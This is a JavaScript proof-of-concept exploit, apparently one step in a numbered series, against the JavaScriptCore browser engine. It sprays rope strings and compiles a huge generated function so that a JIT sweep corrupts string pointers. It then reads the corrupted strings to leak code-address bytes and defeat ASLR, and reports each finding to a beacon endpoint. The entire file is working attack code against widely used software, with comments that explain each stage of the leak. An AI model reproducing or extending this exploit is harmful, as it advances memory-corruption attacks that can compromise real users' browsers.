// p371 - MetadataTable JSString corruption as info leak
//
// PROVEN: p146/p148 showed JSString.m_fiber gets corrupted by the sweep.
// The sweep writes getCTILinkCall().code() (thunk pointer) at entry+24.
// Corrupted m_fiber makes the string's rope resolution follow the thunk
// pointer as if it were a StringImpl. Reading the string extracts bytes
// from the code region at that address -> ASLR info leak.
//
// p146 showed: corrupted strings have .length=81400 (0x13E38)
// This means bytes at thunk+4 (StringImpl::m_length offset) read as 0x13E38.
//
// Strategy:
// 1. Allocate many JSString rope objects (two-part concat strings)
// 2. Compile 38M function (sweep corrupts some m_fiber pointers)
// 3. Scan strings: any with .length != expected was corrupted
// 4. Read charCodeAt() values from corrupted string = code bytes
// 5. Extract thunk pointer from StringImpl header layout
//
// Beacon prefix: V371-

(function() {
  var BQ = 0;
  function B(tag, body) {
    try {
      var u = '/beacon/V371-' + tag + '?t=' + Date.now() + '&q=' + (BQ++);
      if (body !== undefined && String(body).length < 2000) {
        var x = new XMLHttpRequest();
        x.open('POST', u, true);
        x.send(String(body));
      } else {
        new Image().src = u;
      }
    } catch(e) {
      try { new Image().src = '/beacon/V371-ERR-' + tag.substring(0,30); } catch(e2) {}
    }
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  // Phase 1: Spray JSString rope objects
  // Concat creates a rope: left + right stored in m_fiber as JSRopeString fields
  // p146 used strings with .length checks. We need many strings at different
  // MarkedSpace addresses to maximize chance of being in the sweep path.
  var STR_COUNT = 10000;
  var BASE_LEN = 32;
  var strings = new Array(STR_COUNT);
  var strOK = 0;

  // Create unique strings so they're all separate allocations
  for (var i = 0; i < STR_COUNT; i++) {
    try {
      // Left part: 16 chars, unique per string
      var left = 'L' + String(i).padStart(5, '0') + 'AAAAAAAAA';
      // Right part: 16 chars, same pattern
      var right = 'R' + String(i).padStart(5, '0') + 'BBBBBBBBB';
      // Concatenation creates a rope JSString
      strings[i] = left + right;
      strOK++;
    } catch(e) { break; }
  }
  B('STRINGS-' + strOK);

  // Verify baseline: all strings should be length 32
  var baseOK = 0;
  for (var i = 0; i < Math.min(100, STR_COUNT); i++) {
    if (strings[i] && strings[i].length === BASE_LEN) baseOK++;
  }
  B('BASELINE-' + baseOK);

  // Phase 2: GC to settle allocations
  var gcP = [];
  for (var i = 0; i < 40; i++) gcP.push(new ArrayBuffer(65536));
  gcP = null;
  for (var i = 0; i < 20000; i++) var _gc = {a: i};

  setTimeout(function() {
    B('GC-DONE');

    // Phase 3: Compile 38M function
    var N = 38348816;
    var CHUNK = 4000000;
    var nChunks = Math.floor(N / CHUNK);
    var rem = N - nChunks * CHUNK;

    var callChunk = 'a();'.repeat(CHUNK);
    var parts = new Array(nChunks + 3);
    parts[0] = 'window.__p371fn=function(a){';
    for (var c = 0; c < nChunks; c++) parts[1 + c] = callChunk;
    parts[nChunks + 1] = 'a();'.repeat(rem);
    parts[nChunks + 2] = '};window.__p371scan();';
    callChunk = null;

    var blob = new Blob(parts, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    parts = null;

    window.__p371scan = function() {
      B('COMPILED-OK');

      // Phase 4: Scan strings for corruption
      var corrupted = 0;
      var crashed = 0;
      var leakData = [];

      for (var i = 0; i < STR_COUNT; i++) {
        if (!strings[i]) continue;
        try {
          var len = strings[i].length;
          if (len === BASE_LEN) continue;

          // String was corrupted!
          corrupted++;

          if (leakData.length >= 8) continue;

          var info = {idx: i, len: len, chars: [], raw: []};

          // Read the string content: these bytes come from the code region
          // StringImpl layout at the thunk address:
          //   +0: m_refCount (4 bytes)
          //   +4: m_length (4 bytes) = what .length returns
          //   +8: m_data8 pointer (8 bytes) -> where string data is read from
          //   +16: m_hashAndFlags (4 bytes)
          //   +20: actual inline data starts (if is8Bit inline)
          //
          // If the "string" is 8-bit, charCodeAt reads bytes from m_data8 pointer
          // If 16-bit, reads uint16 values from m_data8 pointer
          // Either way, the values are memory content at a code address

          var readLen = Math.min(len, 128);
          var isAllAscii = true;
          for (var j = 0; j < readLen; j++) {
            try {
              var cc = strings[i].charCodeAt(j);
              info.chars.push(cc);
              if (cc > 127) isAllAscii = false;
            } catch(e) {
              info.chars.push(-1);
              break;
            }
          }
          info.is8bit = isAllAscii;

          leakData.push(info);
        } catch(e) {
          crashed++;
        }
      }

      B('SCAN-corrupt' + corrupted + '-crash' + crashed);

      // Phase 5: Report leak data
      for (var k = 0; k < leakData.length; k++) {
        var d = leakData[k];
        B('HIT-' + k + '-idx' + d.idx + '-len' + d.len + '-8bit' + d.is8bit);

        // Encode first 64 chars as hex
        var hex = '';
        for (var j = 0; j < Math.min(d.chars.length, 64); j++) {
          var cc = d.chars[j];
          if (cc < 0) { hex += 'XX'; continue; }
          if (d.is8bit) {
            hex += hexByte(cc & 0xFF);
          } else {
            hex += hexByte(cc & 0xFF) + hexByte((cc >> 8) & 0xFF);
          }
        }
        B('DATA-' + k + '-' + hex.substring(0, 200));

        // Report the corrupted .length value
        // This reveals bytes at thunk+4 in the code region
        // On x86-64, code addresses are typically 0x7fXXXXXXXXXX
        // If .length is a recognizable value, we can deduce the thunk address
        B('LEN-' + k + '-' + d.len + '-hex' + d.len.toString(16));

        // Try to extract pointer-like values from the char data
        // Look at chars 0-3 (first 4 uint16 or 8 uint8): these are at data_ptr+0
        if (d.chars.length >= 8) {
          // Build 8-byte value from first 8 bytes/chars
          var lo, hi;
          if (d.is8bit) {
            lo = (d.chars[0] | (d.chars[1] << 8) | (d.chars[2] << 16) | ((d.chars[3] << 24) >>> 0)) >>> 0;
            hi = (d.chars[4] | (d.chars[5] << 8) | (d.chars[6] << 16) | ((d.chars[7] << 24) >>> 0)) >>> 0;
          } else {
            lo = (d.chars[0] | (d.chars[1] << 16)) >>> 0;
            hi = (d.chars[2] | (d.chars[3] << 16)) >>> 0;
          }
          var ptr = '';
          for (var b = 3; b >= 0; b--) ptr += hexByte((hi >> (b * 8)) & 0xFF);
          for (var b = 3; b >= 0; b--) ptr += hexByte((lo >> (b * 8)) & 0xFF);
          B('PTR-' + k + '-' + ptr);
        }
      }

      // Phase 6: If no corruption found, check if strings are even alive
      if (corrupted === 0) {
        B('NOCORRUPT');
        var alive = 0;
        for (var i = 0; i < Math.min(100, STR_COUNT); i++) {
          try {
            if (strings[i] && strings[i].length === BASE_LEN) alive++;
          } catch(e) {}
        }
        B('ALIVE-' + alive);
      }

      B('DONE');
    };

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;

    setTimeout(function() {
      if (!window.__p371fn) B('TIMEOUT-NO-COMPILE');
    }, 120000);
  }, 2000);
})();
